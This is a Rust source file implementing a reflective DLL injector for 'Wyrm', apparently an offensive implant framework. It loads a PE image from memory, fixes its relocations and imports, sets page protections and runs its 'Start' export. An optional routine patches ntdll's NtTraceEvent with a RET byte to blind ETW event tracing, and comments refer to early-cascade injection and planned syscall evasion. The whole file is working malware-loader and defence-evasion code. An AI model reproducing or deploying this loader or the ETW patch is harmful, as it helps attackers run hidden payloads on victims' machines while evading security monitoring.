//! Reflective DLL injector for Wyrm.
//!
//! This assumes that the DLL is loaded into memory by a wrapper around us which has its own base
//! address.
//!
//! This module should be FULLY NO_STD.

use core::{
    ffi::c_void,
    mem::transmute,
    ptr::{copy_nonoverlapping, null_mut, read_unaligned, write_unaligned},
};

use shared_no_std::export_resolver::{self, find_export_address};
use windows_sys::{
    Win32::{
        Foundation::{FARPROC, HANDLE, HMODULE},
        System::{
            Diagnostics::Debug::{
                IMAGE_DATA_DIRECTORY, IMAGE_DIRECTORY_ENTRY_BASERELOC,
                IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_NT_HEADERS64, IMAGE_SCN_MEM_EXECUTE,
                IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE, IMAGE_SECTION_HEADER,
            },
            Memory::{
                MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
                PAGE_NOACCESS, PAGE_PROTECTION_FLAGS, PAGE_READONLY, PAGE_READWRITE,
                PAGE_WRITECOPY, VIRTUAL_ALLOCATION_TYPE,
            },
            SystemServices::{
                IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER, IMAGE_IMPORT_DESCRIPTOR,
                IMAGE_ORDINAL_FLAG64, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGHLOW,
            },
            WindowsProgramming::IMAGE_THUNK_DATA64,
        },
    },
    core::PCSTR,
};

//
// FFI definitions for functions we require for the RDI to work; note these do NOT use evasion techniques such as
// direct/indirect syscalls or any other magic (for now, maybe they will be locked features).
//
type VirtualAlloc = unsafe extern "system" fn(
    *const core::ffi::c_void,
    usize,
    VIRTUAL_ALLOCATION_TYPE,
    PAGE_PROTECTION_FLAGS,
) -> *mut c_void;

type LoadLibraryA = unsafe extern "system" fn(PCSTR) -> HMODULE;

type VirtualProtect = unsafe extern "system" fn(
    *const core::ffi::c_void,
    usize,
    PAGE_PROTECTION_FLAGS,
    *mut PAGE_PROTECTION_FLAGS,
) -> windows_sys::core::BOOL;

type GetProcAddress = unsafe extern "system" fn(HMODULE, PCSTR) -> FARPROC;

type FlushInstructionCache =
    unsafe extern "system" fn(HANDLE, *mut c_void, usize) -> windows_sys::core::BOOL;

type GetCurrentProcess = unsafe extern "system" fn() -> HANDLE;

/// Function pointers for the Reflective DLL Injector to use.
#[allow(non_snake_case)]
struct RdiExports {
    LoadLibraryA: LoadLibraryA,
    VirtualAlloc: VirtualAlloc,
    VirtualProtect: VirtualProtect,
    GetProcAddresS: GetProcAddress,
    FlushInstructionCache: FlushInstructionCache,
    GetCurrentProcess: GetCurrentProcess,
}

impl RdiExports {
    /// Construct a new [`RdiExports`] by resolving the address of the respective functions in their DLL. Note that these
    /// DLLs either must already be loaded, or the [`RdiExports::new`] function needs to be amended to load those DLLs in
    /// via LoadLibrary or other mechanism to be successful.
    ///
    /// If the function fails to resolve all functions, it will return `None`
    #[inline(always)]
    fn new() -> Option<Self> {
        //
        // Resolve the function addresses from the respective DLL's, note these should be loaded in the process or this
        // will fail
        //
        let lla = export_resolver::resolve_address("kernel32.dll", "LoadLibraryA", None)
            .unwrap_or_default();

        let virtual_alloc = export_resolver::resolve_address("kernel32.dll", "VirtualAlloc", None)
            .unwrap_or_default();

        let vp = export_resolver::resolve_address("kernel32.dll", "VirtualProtect", None)
            .unwrap_or_default();

        let gpa = export_resolver::resolve_address("kernel32.dll", "GetProcAddress", None)
            .unwrap_or_default();

        let fic = export_resolver::resolve_address("kernel32.dll", "FlushInstructionCache", None)
            .unwrap_or_default();

        let curproc = export_resolver::resolve_address("kernel32.dll", "GetCurrentProcess", None)
            .unwrap_or_default();

        //
        // Validate everything was resolved correctly
        //
        if lla.is_null()
            || virtual_alloc.is_null()
            || vp.is_null()
            || gpa.is_null()
            || fic.is_null()
            || curproc.is_null()
        {
            return None;
        }

        unsafe {
            //
            // Cast as fn ptrs correctly
            //
            let lla = transmute::<_, LoadLibraryA>(lla);
            let virtual_alloc = transmute::<_, VirtualAlloc>(virtual_alloc);
            let vp = transmute::<_, VirtualProtect>(vp);
            let gpa = transmute::<_, GetProcAddress>(gpa);
            let fic = transmute::<_, FlushInstructionCache>(fic);
            let curproc = transmute::<_, GetCurrentProcess>(curproc);

            Some(Self {
                LoadLibraryA: lla,
                VirtualAlloc: virtual_alloc,
                VirtualProtect: vp,
                GetProcAddresS: gpa,
                FlushInstructionCache: fic,
                GetCurrentProcess: curproc,
            })
        }
    }
}

#[repr(u32)]
enum RdiErrorCodes {
    Success = 0,
    CouldNotParseExports,
    RelocationsNull,
    MalformedVirtualAddress,
    ImportDescriptorNull,
    NoEntry,
}

/// The entrypoint for the reflective DLL loading. We must take in the base address of our module that
/// we wish to do work on. Any loader must call our Load export with the allocation base address.
#[unsafe(no_mangle)]
pub unsafe extern "system" fn Load(image_base: *mut c_void) -> u32 {
    //
    // Resolve function pointers for Windows API fns we need in the RDI
    //
    let Some(exports) = RdiExports::new() else {
        // We could not resolve all the required function pointers
        return RdiErrorCodes::CouldNotParseExports as _;
    };

    #[cfg(feature = "patch_etw")]
    {
        nostd_patch_etw_current_process(&exports);
    }

    // If we successfully get an image base from ourselves, use that
    let image_base = match calculate_image_base() {
        Some(img) => img,
        None => image_base,
    };

    //
    // Allocate fresh memory and copy sections over assuming we are from an unaligned region of memory
    //
    let image_base = unsafe {
        let dos_header = read_unaligned(image_base as *const IMAGE_DOS_HEADER);

        let nt = read_unaligned(
            image_base.add(dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64
        );

        let p_alloc = (exports.VirtualAlloc)(
            null_mut(),
            nt.OptionalHeader.SizeOfImage as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if p_alloc.is_null() {
            return 0xff;
        }

        let nt_ptr = image_base.add(dos_header.e_lfanew as usize) as *const u8;
        write_payload(p_alloc, image_base as *mut u8, nt_ptr, &nt);

        p_alloc
    };

    //
    // Parse the headers
    //
    let dos_header = unsafe { read_unaligned(image_base as *const IMAGE_DOS_HEADER) };
    let nt_offset = dos_header.e_lfanew as usize;
    let p_nt_headers = (image_base as usize + nt_offset) as *mut IMAGE_NT_HEADERS64;

    //
    // process image relocations
    //
    let data_dir = unsafe { read_unaligned(p_nt_headers) }
        .OptionalHeader
        .DataDirectory;

    let relocations_ptr = ((image_base as usize)
        + data_dir[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].VirtualAddress as usize)
        as *mut IMAGE_BASE_RELOCATION;

    if relocations_ptr.is_null() {
        return RdiErrorCodes::RelocationsNull as _;
    }

    process_relocations(image_base, p_nt_headers, &data_dir);

    //
    // Resolve imports from IAT
    //
    if data_dir[IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress == 0 {
        return RdiErrorCodes::MalformedVirtualAddress as _;
    }

    let import_descriptor_ptr: *mut IMAGE_IMPORT_DESCRIPTOR = get_addr_as_rva(
        image_base as _,
        data_dir[IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress as usize,
    );
    if import_descriptor_ptr.is_null() {
        return RdiErrorCodes::ImportDescriptorNull as _;
    }

    //
    // Resolve the import address table
    //
    patch_iat(image_base, import_descriptor_ptr, &exports);

    relocate_and_commit(image_base, p_nt_headers, &exports);

    // Search by the export of the actual Start from the RDL
    if let Some(f) = find_export_address(image_base, p_nt_headers, "Start") {
        unsafe { f() };
        RdiErrorCodes::Success as _
    } else {
        RdiErrorCodes::NoEntry as _
    }
}

#[inline(always)]
fn relocate_and_commit(
    p_base: *mut c_void,
    p_nt_headers: *mut IMAGE_NT_HEADERS64,
    exports: &RdiExports,
) {
    unsafe {
        // RVA of the first IMAGE_SECTION_HEADER in the PE file
        let section_header_ptr = get_addr_as_rva::<IMAGE_SECTION_HEADER>(
            core::ptr::addr_of!((*p_nt_headers).OptionalHeader) as *const _ as _,
            (*p_nt_headers).FileHeader.SizeOfOptionalHeader as usize,
        );

        //
        // Loop through each section in the PE (.text, .rdata etc) and set the expected protections
        //
        for i in 0..(*p_nt_headers).FileHeader.NumberOfSections {
            let mut protect = 0;
            let mut old_protect = 0;

            let p_section_header = read_unaligned(section_header_ptr.add(i as _));
            // A pointer to where it is actually loaded (base + RVA)
            let p_target = p_base
                .cast::<u8>()
                .add(p_section_header.VirtualAddress as usize);
            let section_raw_size = p_section_header.SizeOfRawData as usize;

            //
            // Now apply the relevant flags depending upon the intention
            //
            let is_x = p_section_header.Characteristics & IMAGE_SCN_MEM_EXECUTE != 0;
            let is_r = p_section_header.Characteristics & IMAGE_SCN_MEM_READ != 0;
            let is_w = p_section_header.Characteristics & IMAGE_SCN_MEM_WRITE != 0;

            if !is_x && !is_r && !is_w {
                protect = PAGE_NOACCESS;
            }

            if is_w {
                protect = PAGE_WRITECOPY;
            }

            if is_r {
                protect = PAGE_READONLY;
            }

            if is_w && is_r {
                protect = PAGE_READWRITE;
            }

            if is_x {
                protect = PAGE_EXECUTE;
            }

            if is_x && is_r {
                protect = PAGE_EXECUTE_READ;
            }

            if is_x && is_w && is_r {
                protect = PAGE_EXECUTE_READWRITE;
            }

            // Change the protection
            (exports.VirtualProtect)(
                p_target as *const _,
                section_raw_size,
                protect,
                &mut old_protect,
            );
        }

        // Flush to prevent stale instruction cache
        (exports.FlushInstructionCache)((exports.GetCurrentProcess)(), null_mut(), 0);
    }
}

#[inline(always)]
fn process_relocations(
    p_image_base: *mut c_void,
    p_nt_headers: *mut IMAGE_NT_HEADERS64,
    data_dir: &[IMAGE_DATA_DIRECTORY; 16],
) {
    unsafe {
        // Calculate the diff between where the DLL actually loaded vs where it was compiled to load
        let load_diff = p_image_base as isize - (*p_nt_headers).OptionalHeader.ImageBase as isize;

        let reloc_rva = data_dir[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].VirtualAddress as usize;
        let reloc_size = data_dir[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].Size as usize;

        // Calculate the actual addresses for the start and end of the relocation table
        let reloc_start = (p_image_base as usize + reloc_rva) as usize;
        let reloc_end = reloc_start + reloc_size;

        let mut p_img_base_relocation = reloc_start as *mut IMAGE_BASE_RELOCATION;

        //
        // iterate through each IMAGE_BASE_RELOCATION block in the relocation table
        //
        while (p_img_base_relocation as usize) < reloc_end
            && (*p_img_base_relocation).SizeOfBlock as usize >= size_of::<IMAGE_BASE_RELOCATION>()
            && (*p_img_base_relocation).VirtualAddress != 0
        {
            // First relocation item
            let item = (p_img_base_relocation as *mut u8).add(size_of::<IMAGE_BASE_RELOCATION>())
                as *const u16;
            // How many relocations to process
            let num_relocations = ((*p_img_base_relocation).SizeOfBlock as usize
                - size_of::<IMAGE_BASE_RELOCATION>())
                / size_of::<u16>();

            //
            // Process each relocation table
            //
            for i in 0..num_relocations {
                // read the entry (16 bits)
                let entry = read_unaligned(item.add(i));
                // Extract the type
                let type_field = (entry >> 12) as u32;
                let roff = (entry & 0x0FFF) as usize;

                // Calculate teh absolute address of the value that needs to be relocated
                // base + page RVA + offset within page
                let patch_addr = (p_image_base as usize
                    + (*p_img_base_relocation).VirtualAddress as usize
                    + roff) as *mut u8;

                //
                // Apply the actual relocation
                //
                match type_field {
                    IMAGE_REL_BASED_DIR64 => {
                        let p = patch_addr as *mut u64;
                        let v = read_unaligned(p);
                        write_unaligned(p, (v as i64 + load_diff as i64) as u64);
                    }
                    IMAGE_REL_BASED_HIGHLOW => {
                        let p = patch_addr as *mut u32;
                        let v = read_unaligned(p);
                        write_unaligned(p, (v as i32 + load_diff as i32) as u32);
                    }
                    _ => {}
                }
            }

            // Move to the next reloc block
            p_img_base_relocation = get_addr_as_rva(
                p_img_base_relocation as _,
                (*p_img_base_relocation).SizeOfBlock as usize,
            );
        }
    }
}

#[inline(always)]
fn patch_iat(
    base_addr_ptr: *mut c_void,
    mut import_descriptor_ptr: *mut IMAGE_IMPORT_DESCRIPTOR,
    exports: &RdiExports,
) -> bool {
    unsafe {
        loop {
            let desc = read_unaligned(import_descriptor_ptr);
            if desc.Name == 0 {
                break;
            }

            let module_name_ptr = get_addr_as_rva::<i8>(base_addr_ptr as _, desc.Name as usize);
            if module_name_ptr.is_null() {
                return false;
            }

            let module_handle = (exports.LoadLibraryA)(module_name_ptr as _);
            if module_handle.is_null() {
                return false;
            }

            let oft = desc.Anonymous.OriginalFirstThunk as usize;
            let mut orig_thunk: *mut IMAGE_THUNK_DATA64 = if oft != 0 {
                get_addr_as_rva(base_addr_ptr as _, oft)
            } else {
                get_addr_as_rva(base_addr_ptr as _, desc.FirstThunk as usize)
            };

            let mut thunk: *mut IMAGE_THUNK_DATA64 =
                get_addr_as_rva(base_addr_ptr as _, desc.FirstThunk as usize);

            loop {
                let ot = read_unaligned(orig_thunk);
                if ot.u1.Function == 0 {
                    break;
                }

                let func_addr = if (ot.u1.Ordinal & IMAGE_ORDINAL_FLAG64) != 0 {
                    //
                    // import by ordinal
                    //
                    let ord = (ot.u1.Ordinal & 0xFFFF) as *const u8;
                    match (exports.GetProcAddresS)(module_handle as _, ord as _) {
                        Some(f) => f as u64,
                        None => return false,
                    }
                } else {
                    //
                    // imports by name
                    //
                    let name_rva = ot.u1.AddressOfData as usize;
                    let name_ptr = get_addr_as_rva::<u8>(base_addr_ptr as _, name_rva).add(2);
                    match (exports.GetProcAddresS)(module_handle as _, name_ptr as _) {
                        Some(f) => f as u64,
                        None => return false,
                    }
                };

                let mut t = read_unaligned(thunk);
                t.u1.Function = func_addr;
                write_unaligned(thunk, t);

                orig_thunk = orig_thunk.add(1);
                thunk = thunk.add(1);
            }

            import_descriptor_ptr = import_descriptor_ptr.add(1);
        }
    }
    true
}

#[inline(always)]
fn get_addr_as_rva<T>(base_ptr: *mut u8, offset: usize) -> *mut T {
    (base_ptr as usize + offset) as *mut T
}

#[inline(always)]
fn write_payload(
    new_base_ptr: *mut c_void,
    old_base_ptr: *mut u8,
    nt_headers_ptr: *const u8,
    nt_headers: &IMAGE_NT_HEADERS64,
) {
    unsafe {
        let section_header_offset = (nt_headers_ptr as usize - old_base_ptr as usize)
            + size_of::<u32>()
            + size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>()
            + nt_headers.FileHeader.SizeOfOptionalHeader as usize;

        let section_header_ptr =
            old_base_ptr.add(section_header_offset) as *const IMAGE_SECTION_HEADER;

        //
        // Enumerate sections
        //
        for i in 0..nt_headers.FileHeader.NumberOfSections {
            // Read section header unaligned
            let header_i = read_unaligned(section_header_ptr.add(i as usize));

            let dst_ptr = new_base_ptr
                .cast::<u8>()
                .add(header_i.VirtualAddress as usize);
            let src_ptr = old_base_ptr.add(header_i.PointerToRawData as usize);
            let raw_size = header_i.SizeOfRawData as usize;

            // Copy section data
            copy_nonoverlapping(src_ptr, dst_ptr, raw_size);
        }

        // Copy PE Headers
        copy_nonoverlapping(
            old_base_ptr,
            new_base_ptr as *mut u8,
            nt_headers.OptionalHeader.SizeOfHeaders as usize,
        );
    }
}

#[inline(always)]
fn nostd_patch_etw_current_process(exports: &RdiExports) {
    let fn_addr = export_resolver::resolve_address("ntdll.dll", "NtTraceEvent", None)
        .unwrap_or_default() as *mut u8;

    if fn_addr.is_null() {
        return;
    }

    let ret_opcode: u8 = 0xC3;

    // Have we already patched?
    if unsafe { *(fn_addr as *mut u8) } == 0xC3 {
        return;
    }

    // Required for 2nd fn call
    let mut unused_protect: u32 = 0;
    // The protection flags to reset to
    let mut old_protect: u32 = 0;

    unsafe {
        (exports.VirtualProtect)(
            fn_addr as *const _,
            1,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
    };
    unsafe { core::ptr::write_bytes(fn_addr, ret_opcode, 1) };
    unsafe { (exports.VirtualProtect)(fn_addr as *const _, 1, old_protect, &mut unused_protect) };
}

fn calculate_image_base() -> Option<*mut c_void> {
    let load_addr = Load as *const () as usize;

    // Round down to 64KB boundary
    let mut current = load_addr & !0xFFFF;

    for _ in 0..16 {
        if is_valid_pe_base(current) {
            let current = current as *mut c_void;
            return Some(current);
        }

        current = current.wrapping_sub(0x10000); // Move back 64KB
    }

    None
}

/// Do our best to validate that the offset we found is actually the start of our injected PE.
/// This is necessary for using early cascade as we cannot pass a parameter into the routine.
fn is_valid_pe_base(addr: usize) -> bool {
    unsafe {
        let base = addr as *const u8;

        let lfanew = read_unaligned(base.add(0x3C) as *const u32);

        // e_lfanew should be reasonable (typically 0x80-0x200)
        if lfanew < 0x40 || lfanew > 0x1000 {
            return false;
        }

        // Verify PE signature at e_lfanew offset
        let pe_sig = read_unaligned(base.add(lfanew as usize) as *const u32);
        if pe_sig != 0x00004550 {
            return false;
        }

        // Verify machine type (x64)
        let machine = read_unaligned(base.add(lfanew as usize + 4) as *const u16);
        if machine != 0x8664 {
            return false;
        }

        // Verify optional header magic
        let opt_magic = read_unaligned(base.add(lfanew as usize + 24) as *const u16);
        if opt_magic != 0x020B {
            return false;
        }

        // Verify SizeOfImage is reasonable
        let size_of_image = read_unaligned(base.add(lfanew as usize + 24 + 56) as *const u32);
        if size_of_image < 0x1000 || size_of_image > 0xA00000 {
            // Between 4KB and 10MB
            return false;
        }

        // Verify ImageBase looks like a valid address
        let image_base_field = read_unaligned(base.add(lfanew as usize + 24 + 24) as *const u64);
        if image_base_field == 0 {
            return false;
        }

        // Verify the address is within SizeOfImage
        let load_offset = (Load as *const c_void as usize).wrapping_sub(addr);
        if load_offset > size_of_image as usize {
            return false;
        }

        true
    }
}
